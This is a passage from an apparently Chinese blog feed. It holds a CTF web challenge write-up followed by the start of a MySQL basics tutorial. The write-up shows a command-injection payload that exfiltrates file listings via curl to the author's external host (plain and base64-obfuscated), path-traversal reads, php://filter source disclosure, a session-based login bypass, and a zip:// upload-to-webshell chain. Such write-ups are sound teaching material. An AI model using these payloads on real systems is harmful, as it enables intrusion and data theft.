src="https://img-blog.csdnimg.cn/20201020132001264.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020132019616.png#pic_center" alt="在这里插入图片描述"><br>真鸡儿困难<br><img src="https://img-blog.csdnimg.cn/20201020132042359.png?x-oss-process=image" alt="在这里插入图片描述"><br>哦，原来文件名叫这个，然后试试列出flagggggggggggggg_1s_here目录下有啥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /;curl 111.229.xxx.17:1234?hello=`ls /flagggggggggggggg_1s_here/*|base64`<br>====&gt;<br>ls /;php -r &#x27;system(base64_decode(&quot;Y3VybCAxMTEuMjI5Lnh4eC4xNzoxMjM0P2hlbGxvPWBscyAvZmxhZ2dnZ2dnZ2dnZ2dnZ2dfMXNfaGVyZS8qfGJhc2U2NGA=&quot;));&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020132436153.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020132451428.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020132520323.png?x-oss-process=image" alt="在这里插入图片描述"><br>反手就是一个读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://47.94.239.194:8082/displaySourceCode.php?phpfile=../../../../../flagggggggggggggg_1s_here/flag<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020132626364.png#pic_center" alt="在这里插入图片描述"><br>有一说一我真菜做了好久好久</p><hr><h2 id="Myblog"><a href="#Myblog" class="headerlink" title="Myblog"></a>Myblog</h2><p>题目地址:<a href="http://173.82.206.142:8006/">http://173.82.206.142:8006/</a> 或访问 <a href="http://120.27.146.26:8002/">http://120.27.146.26:8002/</a><br>题目描述:我写了个简单的博客,欢迎大家来访问!<br>提示：</p><ul><li>1.Do you know the PHP pseudo-protocol? </li><li>2.Every 5 minutes remove all upload files.</li></ul><p>进去以后是Home<br><img src="https://img-blog.csdnimg.cn/20201020155420206.png?x-oss-process=image" alt="在这里插入图片描述"><br>找了一圈，发现两个比价有用的线索</p><ul><li>不管访问什么界面，url都是<code>index.php?page=xxx</code></li><li>login登录界面</li></ul><p>根据网url推测这个<code>page</code>是文件包含，试试php伪协议读取源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://173.82.206.142:8006/index.php?page=php://filter/read=convert.base64-encode/resource=login.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020155931442.png?x-oss-process=image" alt="在这里插入图片描述"><br>读取不出来，但是想到原来url的末尾是<code>?page=home</code>，试试去掉<code>.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://173.82.206.142:8006/index.php?page=php://filter/read=convert.base64-encode/resource=login<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020155843296.png?x-oss-process=image" alt="在这里插入图片描述"><br>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;<br>    &lt;title&gt;Login&lt;/title&gt;<br>    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;<br>    &lt;meta name=&quot;robots&quot; content=&quot;all,follow&quot;&gt;<br>    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/css/bootstrap.min.css&quot;&gt;<br>    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.default.css&quot; id=&quot;theme-stylesheet&quot;&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div class=&quot;page login-page&quot;&gt;<br>      &lt;div class=&quot;container d-flex align-items-center&quot;&gt;<br>        &lt;div class=&quot;form-holder has-shadow&quot;&gt;<br>          &lt;div class=&quot;row&quot;&gt;<br>            &lt;!-- Logo &amp; Information Panel--&gt;<br>            &lt;div class=&quot;col-lg-6&quot;&gt;<br>              &lt;div class=&quot;info d-flex align-items-center&quot;&gt;<br>                &lt;div class=&quot;content&quot;&gt;<br>                  &lt;div class=&quot;logo&quot;&gt;<br>                    &lt;h1&gt;欢迎登录&lt;/h1&gt;<br>                  &lt;/div&gt;<br>                  &lt;p&gt;—— 博客后台 ——&lt;/p&gt;<br>                &lt;/div&gt;<br>              &lt;/div&gt;<br>            &lt;/div&gt;<br>            &lt;!-- Form Panel    --&gt;<br>            &lt;div class=&quot;col-lg-6 bg-white&quot;&gt;<br>              &lt;div class=&quot;form d-flex align-items-center&quot;&gt;<br>                &lt;div class=&quot;content&quot;&gt;<br>                  &lt;form method=&quot;post&quot; action=&quot;/?page=admin/user&quot; class=&quot;form-validate&quot; id=&quot;loginFrom&quot;&gt;<br>                    &lt;div class=&quot;form-group&quot;&gt;<br>                      &lt;input id=&quot;login-username&quot; type=&quot;text&quot; name=&quot;username&quot; required data-msg=&quot;请输入用户名&quot; placeholder=&quot;用户名&quot; class=&quot;input-material&quot;&gt;<br>                    &lt;/div&gt;<br>                    &lt;div class=&quot;form-group&quot;&gt;<br>                      &lt;input id=&quot;login-password&quot; type=&quot;password&quot; name=&quot;password&quot; required data-msg=&quot;请输入密码&quot; placeholder=&quot;密码&quot; class=&quot;input-material&quot;&gt;<br>                    &lt;/div&gt;<br>                    &lt;button id=&quot;login&quot; type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;登录&lt;/button&gt;<br>                    &lt;div style=&quot;margin-top: -40px;&quot;&gt; <br>                    &lt;!-- &lt;input type=&quot;checkbox&quot;  id=&quot;check1&quot;/&gt;&amp;nbsp;&lt;span&gt;记住密码&lt;/span&gt;<br>                    &lt;input type=&quot;checkbox&quot; id=&quot;check2&quot;/&gt;&amp;nbsp;&lt;span&gt;自动登录&lt;/span&gt; --&gt;<br>                    &lt;div class=&quot;custom-control custom-checkbox &quot; style=&quot;float: right;&quot;&gt;<br>    &lt;input type=&quot;checkbox&quot; class=&quot;custom-control-input&quot; id=&quot;check2&quot; &gt;<br>    &lt;label class=&quot;custom-control-label&quot; for=&quot;check2&quot;&gt;自动登录&lt;/label&gt;<br>&lt;/div&gt;<br>&lt;div class=&quot;custom-control custom-checkbox &quot; style=&quot;float: right;&quot;&gt;<br>    &lt;input type=&quot;checkbox&quot; class=&quot;custom-control-input&quot; id=&quot;check1&quot; &gt;<br>    &lt;label class=&quot;custom-control-label&quot; for=&quot;check1&quot;&gt;记住密码&amp;nbsp;&amp;nbsp;&lt;/label&gt;<br>&lt;/div&gt; <br>                    &lt;/div&gt;<br>                  &lt;/form&gt;<br>                  &lt;br /&gt;<br>                  &lt;small&gt;没有账号?&lt;/small&gt;&lt;a href=&quot;#&quot; class=&quot;signup&quot;&gt;&amp;nbsp;不给注册&lt;/a&gt;<br>                &lt;/div&gt;<br>              &lt;/div&gt;<br>            &lt;/div&gt;<br>          &lt;/div&gt;<br>        &lt;/div&gt;<br>      &lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;!-- JavaScript files--&gt;<br>    &lt;script src=&quot;https://libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;<br>    &lt;script src=&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/bootstrap.min.js&quot;&gt;&lt;/script&gt;<br>    &lt;script src=&quot;vendor/jquery-validation/jquery.validate.min.js&quot;&gt;&lt;/script&gt;&lt;!--表单验证--&gt;<br>    &lt;!-- Main File--&gt;<br>    &lt;script src=&quot;js/front.js&quot;&gt;&lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br>&lt;?php<br>require_once(&quot;secret.php&quot;);<br>mt_srand($secret_seed);<br>$_SESSION[&#x27;password&#x27;] = mt_rand();<br>?&gt;<br><br></code></pre></td></tr></table></figure><p>这个代码好像没啥用，放着吧。</p><p>然后观察一下登录界面的源码，可以发现有一个<code>admin/user</code>目录<br><img src="https://img-blog.csdnimg.cn/20201020160652965.png?x-oss-process=image" alt="在这里插入图片描述"><br>包含一下这个：<br><img src="https://img-blog.csdnimg.cn/20201020160717216.png?x-oss-process=image" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>&lt;?php<br>error_reporting(0);<br>session_start();<br>$logined = false;<br>if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123;<br>if ($_POST[&#x27;username&#x27;] === &quot;Longlone&quot; and $_POST[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])&#123;  // No one knows my password, including myself<br>$logined = true;<br>$_SESSION[&#x27;status&#x27;] = $logined;<br>&#125;<br>&#125;<br>if ($logined === false &amp;&amp; !isset($_SESSION[&#x27;status&#x27;]) || $_SESSION[&#x27;status&#x27;] !== true)&#123;<br>    echo &quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;;<br>die();<br>&#125;<br>?&gt;<br><br><br>  &lt;?php<br>if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123;<br>$tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;];<br>$tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;];<br>if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123;<br>$allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;);<br>if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123;<br>$upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension;<br>move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name);<br>echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;;<br>&#125; else &#123;<br>echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;;<br>&#125;<br>&#125;<br>&#125;<br>  ?&gt;<br><br></code></pre></td></tr></table></figure><p>中间的HTML代码都没用，已经删去。这里有两个php代码，第一个php是登录用的代码，第二个是上传用的代码，先看登录代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>error_reporting(0);<br>session_start();<br>$logined = false;<br>if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123;<br>if ($_POST[&#x27;username&#x27;] === &quot;Longlone&quot; and $_POST[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])&#123;  // No one knows my password, including myself<br>$logined = true;<br>$_SESSION[&#x27;status&#x27;] = $logined;<br>&#125;<br>&#125;<br>if ($logined === false &amp;&amp; !isset($_SESSION[&#x27;status&#x27;]) || $_SESSION[&#x27;status&#x27;] !== true)&#123;<br>    echo &quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;;<br>die();<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>重点是<code>if ($_POST[&#39;username&#39;] === &quot;Longlone&quot; and $_POST[&#39;password&#39;] == $_SESSION[&#39;password&#39;])</code><br>要求<code>$_POST[&#39;password&#39;] == $_SESSION[&#39;password&#39;])</code><br>我们可以把session这边的cookie删掉，然后上传一个空密码就行啦，顺利绕过登陆~<br>操作步骤如下：<br><img src="https://img-blog.csdnimg.cn/20201020171543487.png?x-oss-process=image" alt="在这里插入图片描述"><br>删掉以后：<br><img src="https://img-blog.csdnimg.cn/2020102017160774.png?x-oss-process=image" alt="在这里插入图片描述"><br>再输入用户名，点击登录发现这个是个必须填写的选项。<br><img src="https://img-blog.csdnimg.cn/20201020171708945.png?x-oss-process=image" alt="在这里插入图片描述"><br>这个东西可以在前端进行修改，在查看器那边将<code>require</code>删掉即可。<br><img src="https://img-blog.csdnimg.cn/20201020172227941.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020172246278.png?x-oss-process=image" alt="在这里插入图片描述"><br>然后就登录进去了。</p><p>这里有个上传入口，而且后台代码都给你了，想都不想肯定是上传漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123;<br>$tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;];<br>$tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;];<br>if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123;<br>$allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;);<br>if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123;<br>$upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension;<br>move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name);<br>echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;;<br>&#125; else &#123;<br>echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;;<br>&#125;<br>&#125;<br>&#125;<br>  ?&gt;<br></code></pre></td></tr></table></figure><p>这里采用白名单过滤，于是可以将php文件打包成zip，改后缀名为jpg，再利用<code>zip</code>伪协议进行读取。</p><p>直接上手：<br><img src="https://img-blog.csdnimg.cn/20201020172549118.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020172617403.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020172642950.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020172649150.png#pic_center" alt="在这里插入图片描述"><br>然后上传：<br><img src="https://img-blog.csdnimg.cn/2020102017272642.png#pic_center" alt="在这里插入图片描述"><br>访问一下：<br><img src="https://img-blog.csdnimg.cn/20201020172759739.png#pic_center" alt="在这里插入图片描述"><br>发现有文件，但是没办法显示（出不来是因为我们这个文件是个压缩包，不是个正经的图片）</p><p>然后利用zip伪协议读取一下，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zip:// + zip路径 + %23 + php文件名<br>http://173.82.206.142:8006/?page=zip://./upload/6f49107b371dc2c26e97d8579ecf2c0979936271.jpg%231<br>#这里不加.php后缀是因为在index.php包含的时候默认加上了<br></code></pre></td></tr></table></figure><p>同时上传一个cmd变量执行命令<br><img src="https://img-blog.csdnimg.cn/20201020173318530.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020173335768.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020173357634.png?x-oss-process=image" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WriteUP&quot;&gt;&lt;a href=&quot;#WriteUP&quot; class=&quot;headerlink&quot; title=&quot;WriteUP&quot;&gt;&lt;/a&gt;WriteUP&lt;/h1&gt;&lt;p&gt;极客要打一个月，本菜鸡就打了前半个月，后半个月因为其（老）他（懒）比（狗）赛（了）就没接着做题，虽然</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MySQL基本操作</title>
    <link href="http://www.w4ke.cn/2020/11/21/MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>http://www.w4ke.cn/2020/11/21/MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</id>
    <published>2020-11-21T14:18:00.000Z</published>
    <updated>2021-12-27T15:11:27.862Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">菜鸟教程传送门</a></p><p>这里只做一些简单的摘记，如果想系统的学习或者针对某个模块进行学习还请参考菜鸟教程的链接。<br>对数据库的操作主要讲究增、删、改、查，这里也以这个为大纲进行讲解。</p><hr><h1 id="MySQL基本结构"><a href="#MySQL基本结构" class="headerlink" title="MySQL基本结构"></a>MySQL基本结构</h1><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p><img src="https://img-blog.csdnimg.cn/20200927150142276.png?x-oss-process=image" alt="在这里插入图片描述"><br>首先要讲的是数据库，一个服务器往往有好几个数据库，像<code>information_schema</code>,<code>mysql</code>,<code>performace_schema</code>,<code>phpmyadmin</code>,<code>sys</code>是内置的库，然后像<code>employ</code>,<code>wordfriend</code>这两个数据库是我自己创建的。一个库里面可以放很多个表，是MySQL最大的一个存储单位。</p><h2 id="表"><a href="#表" class="headerlink" title="表"></a>表</h2><p><img src="https://img-blog.csdnimg.cn/20200927150728815.png?x-oss-process=image" alt="在这里插入图片描述"><br>这里的<code>emai</code>l等四个就是表，一个表里可以装好几个字段。</p><h2 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h2><p><img src="https://img-blog.csdnimg.cn/20200927151441445.png?x-oss-process=image" alt="在这里插入图片描述"><br>一个表里可以有好几个字段，<code>email</code>表里有两个字段，一个字段叫 <code>id</code>，另一个叫<code>email</code>，每个字段下面都有很多内容。</p><p>MySQL结构介绍完毕，接下来介绍MySQL的一些基本语法。</p><hr><h1 id="MySQL基本语法"><a href="#MySQL基本语法" class="headerlink" title="MySQL基本语法"></a>MySQL基本语法</h1><h2 id="登录MySQL"><a href="#登录MySQL" class="headerlink" title="登录MySQL"></a>登录MySQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql -u username -p   回车<br>密码<br><br>eg：mysql -u root -p<br>root<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927145457482.png?x-oss-process=image" alt="在这里插入图片描述"><br>输入密码的时候看不到，不要以为自己键盘坏了。</p><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p>这里的增主要是新建数据库、数据库内添加表、表内添加字段，字段里面添加内容。</p><ul><li><p><strong>新建数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">create database 数据库名;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927152221205.png#pic_center" alt="在这里插入图片描述"><br>创建了一个数据库叫<code>wake</code>。<br><img src="https://img-blog.csdnimg.cn/20200927152307292.png#pic_center" alt="在这里插入图片描述"></p></li><li><p><strong>创建表</strong><br>首先<code>use wake;</code>  =&gt; 使用<code>wake</code>数据库。<br>只有进入了该数据库以后接下来的操作才有效，不然会报错。<br><img src="https://img-blog.csdnimg.cn/20200927161240631.png#pic_center" alt="在这里插入图片描述"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">create table table_name (column_name column_type);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202009271613204.png?x-oss-process=image" alt="在这里插入图片描述"><br>这里我创建了一个叫<code>wake_table</code>的表，然后还创建了两个字段，一个叫<code>wake_column1</code>，是字符型，长度为100；另一个叫<code>wake_column2</code>，是数值型。</p><ul><li><p><strong>创建字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">alter table table_name add column_name column_type;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927175402251.png#pic_center" alt="在这里插入图片描述"></p></li><li><p><strong>给字段赋值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">INSERT INTO table_name (字段1 , 字段2 , 字段3) values (value1 , value2 , value3 );<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927180314339.png?x-oss-process=image" alt="在这里插入图片描述"></p></li></ul><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><ul><li><p><strong>删数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">drop database &lt;数据库名&gt;;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927180626600.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p><strong>删表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">DROP TABLE table_name ;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927181235966.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p><strong>删字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ALTER TABLE 表名 DROP 字段名;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927181402432.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p><strong>删内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">DELETE FROM table_name +条件<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927181743179.png?x-oss-process=image" alt="在这里插入图片描述"></p></li></ul><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><ul><li><p><strong>改表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">rename table oldtable to newtable;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927191851470.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p><strong>改字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">alter table table_name change column old_name new_name type;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927192314234.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p><strong>改内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UPDATE table_name SET field1=new-value1, field2=new-value2 +条件<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927192745274.png?x-oss-process=image" alt="在这里插入图片描述"></p></li></ul><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><ul><li><strong>查库名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show databases;        #查看该服务器一共有几个数据库<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020092719295387.png?x-oss-process=image" alt="在这里插入图片描述"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select database();        #查看当前使用的数据库<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200927193103248.png#pic_center" alt="在这里插入图片描述"></li></ul><ul><li><p><strong>查表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show tables;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927193233336.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select table_name from information_schema.tables where table_schema = database();<br>select table_name from information_schema.tables where table_schema = &#x27;wake&#x27;;<br>#这里 database() 等效于 ‘wake’，都是表示数据库名<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927193426376.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020092719353524.png#pic_center" alt="在这里插入图片描述"><br>这个操作能实现的原理是，<code>information_schema</code>库里面存放了当前服务器的所有库名、表名、字段名，便于管理。<br><img src="https://img-blog.csdnimg.cn/20200927194416396.png?x-oss-process=image" alt="在这里插入图片描述"><br>这里在左边可以看到<code>page</code>和<code>word</code>表是在wordfriend里面的，然后在<code>information_schema</code>数据库的<code>tables</code>数据库中，可以看到这两个表的<code>TABLE_SCHEMA</code>字段就是<code>wordfriend</code>，所以可以根据这个进行查询。</p></li><li><p><strong>查字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from awake_table;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020092720050956.png#pic_center" alt="在这里插入图片描述"></p></li></ul><figure class="highlight plaintext"><table><tr><td 